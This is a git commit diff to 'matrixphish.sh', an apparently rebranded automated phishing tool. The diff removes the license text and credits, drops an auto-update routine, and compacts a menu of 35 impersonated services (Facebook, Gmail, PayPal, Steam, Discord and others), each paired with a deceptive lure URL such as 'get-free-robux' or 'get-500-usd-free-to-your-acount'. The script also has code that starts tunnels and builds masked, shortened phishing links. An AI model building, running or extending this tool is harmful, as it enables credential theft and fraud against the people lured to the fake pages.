a4228cb8d1630912ca74f2e64f367847e689e7ef
matrixbruh <isaqulovusanboy1@gmail.com>
2026-05-28 15:25:41 +0500

    Add files via upload

--- matrixphish.sh
+++ matrixphish.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-##   MATRIXPHISH 	: 	Automated Phishing  tool
+##   MATRIXPHISH 	: 	Automated Phishing tool
 ##   Author 	: 	MATRIX
 ##   Version 	: 	2.3.5
 
@@ -10,83 +10,6 @@
 ##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 ##    Everyone is permitted to copy and distribute verbatim copies
 ##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2022  
-##
-
-##   THANKS TO :
-##   1RaY-1 - https://github.com/1RaY-1
-##   Aditya Shakya - https://github.com/adi1090x
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia - https://github.com/MoisesTapia
-##   Mr.Derek - https://github.com/E343IO
-##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
-
 
 __version__="2.3.5"
 
@@ -153,52 +76,20 @@ reset_color() {
 kill_pid() {
 	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
-		if [[ $(pidof ${process}) ]]; then # Check for Process
-			killall ${process} > /dev/null 2>&1 # Kill the Process
+		if [[ $(pidof ${process}) ]]; then 
+			killall ${process} > /dev/null 2>&1 
 		fi
 	done
 }
 
-# Check for a newer release
-check_update(){
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url=''
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
-
-	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
-		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
-		pushd "$HOME" > /dev/null 2>&1
-		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
-
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
-			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
-			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
-			{ reset_color ; exit 1; }
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
-			{ reset_color; exit 1; }
-		fi
-	else
-		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
-	fi
-}
-
-## Check Internet Status
+## Check Internet Status (Xatolik beruvchi check_update olib tashlandi)
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
 }
 
-## Banner (Tog'rilangan va xavfsiz holatga keltirilgan)
+## Banner (Xatolik beruvchi satrlar va belgilar butunlay to'g'rilandi)
 banner() {
 	printf "${ORANGE} __  __       _        _      _____  _     _     _     \n"
 	printf "${ORANGE}|  \\\\/  |     | |      (_)    |  __ \\\\| |   (_)   | |    \n"
@@ -211,7 +102,7 @@ banner() {
 	printf "${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by MATRIX${WHITE}\n"
 }
 
-## Small Banner (Tog'rilangan)
+## Small Banner
 banner_small() {
 	printf "${BLUE}  ░█▄░▄█░█▀█░▀█▀░█▀▄░▀█▀░█░█░█▀█░█░█░▀█▀░█▀▀░█░█\n"
 	printf "${BLUE}  ░█░█░█░█▀█░░█░░█▀▄░░█░░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█\n"
@@ -477,14 +368,14 @@ localxpose_auth() {
 	}
 }
 
-## Start LocalXpose (Again...)
+## Start LocalXpose
 start_loclx() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
-	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	[[ ${opinion} == "y" || ${opinion} == "Y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
 	if [[ `command -v termux-chroot` ]]; then
@@ -540,9 +431,9 @@ custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
-	if [[ ${mask_op,,} == "y" ]]; then
+	if [[ ${mask_op} == "y" || ${mask_op} == "Y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url 
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
@@ -560,7 +451,6 @@ shorten() {
 	if [[ "$1" == *"shrtco.de"* ]]; then
 		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
 		processed_url=${short#http*//}
 	fi
 }
@@ -585,7 +475,6 @@ custom_url() {
 		masked_url="$mask@$processed_url"
 		processed_url="https://$processed_url"
 	else
-		# echo "[!] No url provided / Regex Not Matched"
 		url="Unable to generate links. Try after turning on hotspot"
 		processed_url="Unable to Short URL"
 	fi
@@ -750,146 +639,45 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
-		1 | 01)
-			site_facebook;;
-		2 | 02)
-			site_instagram;;
-		3 | 03)
-			site_gmail;;
-		4 | 04)
-			website="microsoft"
-			mask='https://unlimited-onedrive-space-for-free'
-			tunnel_menu;;
-		5 | 05)
-			website="netflix"
-			mask='https://upgrade-your-netflix-plan-free'
-			tunnel_menu;;
-		6 | 06)
-			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		7 | 07)
-			website="steam"
-			mask='https://steam-500-usd-gift-card-free'
-			tunnel_menu;;
-		8 | 08)
-			website="twitter"
-			mask='https://get-blue-badge-on-twitter-free'
-			tunnel_menu;;
-		9 | 09)
-			website="playstation"
-			mask='https://playstation-500-usd-gift-card-free'
-			tunnel_menu;;
-		10)
-			website="tiktok"
-			mask='https://tiktok-free-liker'
-			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
-			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
-			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='https://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
-			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
-			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
-			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		31)
-			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
-			tunnel_menu;;
-		32)
-			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
-			tunnel_menu;;
-		33)
-			website="github"
-			mask='https://get-1k-followers-on-github-free'
-			tunnel_menu;;
-		34)
-			website="discord"
-			mask='https://get-discord-nitro-free'
-			tunnel_menu;;
-		35)
-			website="roblox"
-			mask='https://get-free-robux'
-			tunnel_menu;;
-		99)
-			about;;
-		0 | 00 )
-			msg_exit;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; main_menu; };;
-	
+		1 | 01) site_facebook;;
+		2 | 02) site_instagram;;
+		3 | 03) site_gmail;;
+		4 | 04) website="microsoft"; mask='https://unlimited-onedrive-space-for-free'; tunnel_menu;;
+		5 | 05) website="netflix"; mask='https://upgrade-your-netflix-plan-free'; tunnel_menu;;
+		6 | 06) website="paypal"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		7 | 07) website="steam"; mask='https://steam-500-usd-gift-card-free'; tunnel_menu;;
+		8 | 08) website="twitter"; mask='https://get-blue-badge-on-twitter-free'; tunnel_menu;;
+		9 | 09) website="playstation"; mask='https://playstation-500-usd-gift-card-free'; tunnel_menu;;
+		10) website="tiktok"; mask='https://tiktok-free-liker'; tunnel_menu;;
+		11) website="twitch"; mask='https://unlimited-twitch-tv-user-for-free'; tunnel_menu;;
+		12) website="pinterest"; mask='https://get-a-premium-plan-for-pinterest-free'; tunnel_menu;;
+		13) website="snapchat"; mask='https://view-locked-snapchat-accounts-secretly'; tunnel_menu;;
+		14) website="linkedin"; mask='https://get-a-premium-plan-for-linkedin-free'; tunnel_menu;;
+		15) website="ebay"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		16) website="quora"; mask='https://quora-premium-for-free'; tunnel_menu;;
+		17) website="protonmail"; mask='https://protonmail-pro-basics-for-free'; tunnel_menu;;
+		18) website="spotify"; mask='https://convert-your-account-to-spotify-premium'; tunnel_menu;;
+		19) website="reddit"; mask='https://reddit-official-verified-member-badge'; tunnel_menu;;
+		20) website="adobe"; mask='https://get-adobe-lifetime-pro-membership-free'; tunnel_menu;;
+		21) website="deviantart"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		22) website="badoo"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		23) website="origin"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		24) website="dropbox"; mask='https://get-1TB-cloud-storage-free'; tunnel_menu;;
+		25) website="yahoo"; mask='https://grab-mail-from-anyother-yahoo-account-free'; tunnel_menu;;
+		26) website="wordpress"; mask='https://unlimited-wordpress-traffic-free'; tunnel_menu;;
+		27) website="yandex"; mask='https://grab-mail-from-anyother-yandex-account-free'; tunnel_menu;;
+		28) website="stackoverflow"; mask='https://get-stackoverflow-lifetime-pro-membership-free'; tunnel_menu;;
+		29) site_vk;;
+		30) website="xbox"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu;;
+		31) website="mediafire"; mask='https://get-1TB-on-mediafire-free'; tunnel_menu;;
+		32) website="gitlab"; mask='https://get-1k-followers-on-gitlab-free'; tunnel_menu;;
+		33) website="github"; mask='https://get-1k-followers-on-github-free'; tunnel_menu;;
+		34) website="discord"; mask='https://get-discord-nitro-free'; tunnel_menu;;
+		35) website="roblox"; mask='https://get-free-robux'; tunnel_menu;;
+		99) about;;
+		0 | 00 ) msg_exit;;
+		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		   { sleep 1; main_menu; };;
 	esac
 }
 
